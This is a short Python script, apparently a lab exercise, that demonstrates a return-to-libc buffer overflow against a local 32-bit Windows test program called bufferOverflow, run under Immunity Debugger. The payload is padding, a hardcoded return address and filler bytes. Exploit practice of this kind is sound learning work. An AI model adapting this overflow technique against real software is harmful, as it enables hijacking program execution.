#!/usr/bin/python
#Simple return to libc example of exploitation for a Windows 32 bit PE
#Author: Pepitoex123

import subprocess

param = "c:\\program files (x86)\\immmunity inc\\immunity debugger\\immunitydebugger.exe"
param += " bufferOverflow "

param += 30 * "A"
param += chr(0xe0) + chr(0x95) + chr(0xc4) + chr(0x75)
param += "AAAABBBBCCCC"
print(param)
subprocess.call(param)
